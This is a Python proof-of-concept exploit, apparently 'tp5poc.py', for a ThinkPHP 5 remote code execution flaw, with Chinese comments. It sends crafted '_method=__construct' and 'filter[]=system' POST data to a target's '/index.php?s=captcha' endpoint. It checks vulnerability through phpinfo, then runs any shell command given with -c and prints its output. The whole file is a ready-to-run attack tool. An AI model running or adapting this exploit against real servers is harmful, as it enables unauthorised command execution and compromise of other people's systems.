import argparse
import textwrap
import requests
import sys
requests.packages.urllib3.disable_warnings()

def main(url, cmd, func="phpinfo"):
    # 1.发请求
    full_url = f"{url}/index.php?s=captcha"
    headers = {"Upgrade-Insecure-Requests": "1",
               "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36",
               "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
               "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8", "Connection": "close",
               "Content-Type": "application/x-www-form-urlencoded"}
    data1 = {"_method": "__construct", "filter[]": f"{func}", "method": "get", "server[REQUEST_METHOD]": "-1"}
    data2 = {"_method": "__construct", "filter[]": "system", "method": "get", "server[REQUEST_METHOD]": f"{cmd}"}
    try:
        response1 = requests.post(full_url, headers=headers, data=data1, verify=False, timeout=5, allow_redirects=False)
        response2 = requests.post(full_url, headers=headers, data=data2, verify=False, timeout=5, allow_redirects=False)
    except Exception as e:
        print(f"[-]{url}请求失败")
        sys.exit(1)
    # 2.判断是否存在漏洞
    if response1.status_code == 200 and "PHP Extension Build" in response1.text:
        print(f"[+]{url}存在远程代码执行漏洞")
        res = response2.text.split("<!DOCTYPE html>")[0].strip()
        print(f"[+]{cmd}命令执行的回显为：\n{res}")
    else:
        print(f"[-]{url}不存在远程代码执行漏洞")


if __name__ == '__main__':
    banner = r"""
 _   _     _       _          _          ____                 
| |_| |__ (_)_ __ | | ___ __ | |__  _ __| ___|   _ __ ___ ___ 
| __| '_ \| | '_ \| |/ / '_ \| '_ \| '_ \___ \  | '__/ __/ _ \
| |_| | | | | | | |   <| |_) | | | | |_) |__) | | | | (_|  __/
 \__|_| |_|_|_| |_|_|\_\ .__/|_| |_| .__/____/  |_|  \___\___|
                       |_|         |_|    
    """
    print(banner)
    # 使用argparse去解析命令行传来的参数
    parser = argparse.ArgumentParser(description="thinkphp5 rce poc",
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog=textwrap.dedent("""example: python3 tp5poc.py -u http://www.xxx.com -c id"""))
    # 添加参数
    parser.add_argument("-u", "--url", dest="url", type=str, help="input a url")
    parser.add_argument("-c", "--cmd", dest="cmd", type=str, help="input a cmd")
    # 把参数的值解析到对象中
    args = parser.parse_args()

    main(args.url, args.cmd)
